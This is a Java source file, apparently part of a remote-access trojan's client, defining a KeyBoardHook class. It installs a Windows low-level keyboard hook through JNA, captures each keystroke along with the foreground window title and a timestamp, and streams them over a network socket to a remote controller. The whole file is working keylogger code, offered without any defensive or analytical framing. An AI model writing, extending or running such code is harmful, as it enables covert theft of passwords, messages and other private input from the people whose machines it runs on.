package me.client.send;

import com.sun.jna.platform.win32.*;
import me.client.utils.LoadDLL;
import me.client.utils.LoadUser32;
import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyBoardHook extends Thread{
    Socket socket;
    public volatile boolean run = false;
    public KeyBoardHook(Socket socket) {
        this.socket = socket;
    }
    private WinUser.HHOOK hhk;
    private static WinDef.HWND hwnd;
    private WinUser.LowLevelKeyboardProc keyboardProc = new WinUser.LowLevelKeyboardProc() {
        @Override
        public WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinUser.KBDLLHOOKSTRUCT event) {
            if ((wParam.intValue() >= 0x2f) && (wParam.intValue() <= 0x100)) {
                if (!hwnd.equals(User32.INSTANCE.GetForegroundWindow())) {
                    SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
                    char[] lpString = new char[260];
                    hwnd = User32.INSTANCE.GetForegroundWindow();
                    User32.INSTANCE.GetWindowText(hwnd,lpString,260);
                    String title = "\n" + "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
                    try {
                        SendMessage.send(MessageFlags.UPDATE_KEYBORAD,
                                title.getBytes("GBK"),socket);
                    } catch (UnsupportedEncodingException e) {
                    }
                }
                    String str = String.valueOf(Win32VK.fromValue(event.vkCode)).replace("VK_", "");
                if (str.length() >= 2) {
                    if (event.vkCode == 0x0D) {
                        try {
                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, "\n".getBytes("GBK"), socket);
                        } catch (UnsupportedEncodingException e) {
                            throw new RuntimeException(e);
                        }
                    } else {
                        try {
                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, ("[" + str + "]").getBytes("GBK"), socket);
                        } catch (UnsupportedEncodingException e) {
                            throw new RuntimeException(e);
                        }
                    }
                } else {
                    if (LoadUser32.instance.GetKeyState(0x14).equals(new WinDef.SHORT(0))) {
                        try {
                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, str.toLowerCase().getBytes("GBK"), socket);
                        } catch (UnsupportedEncodingException e) {
                        }
                    } else {
                        try {
                            SendMessage.send(MessageFlags.UPDATE_KEYBORAD, str.getBytes("GBK"), socket);
                        } catch (UnsupportedEncodingException e) {
                        }
                    }
                }
            }
            return com.sun.jna.platform.win32.User32.INSTANCE.CallNextHookEx(hhk, nCode, wParam, null);
        }
    };
    @Override
    public void run() {
        SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
        char[] lpString = new char[260];
        hwnd = User32.INSTANCE.GetForegroundWindow();
        User32.INSTANCE.GetWindowText(hwnd,lpString,260);
        String title = "时间:" + format.format(new Date()) + " 标题:" +  String.valueOf(lpString) + "\n";
        try {
            SendMessage.send(MessageFlags.UPDATE_KEYBORAD,
                    title.getBytes("GBK"),socket);
        } catch (UnsupportedEncodingException e) {
        }
        while (run) {
            setHookOn();
        }
    }
    public void setHookOn() {
        WinDef.HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        hhk = com.sun.jna.platform.win32.User32.INSTANCE.SetWindowsHookEx(com.sun.jna.platform.win32.User32.WH_KEYBOARD_LL, keyboardProc, hMod, 0);
        int result;
        WinUser.MSG msg = new WinUser.MSG();
        while ((result = com.sun.jna.platform.win32.User32.INSTANCE.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                setHookOff();
                break;
            } else {
                com.sun.jna.platform.win32.User32.INSTANCE.TranslateMessage(msg);
                com.sun.jna.platform.win32.User32.INSTANCE.DispatchMessage(msg);
            }
        }
    }

    public void setHookOff() {
        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }
}
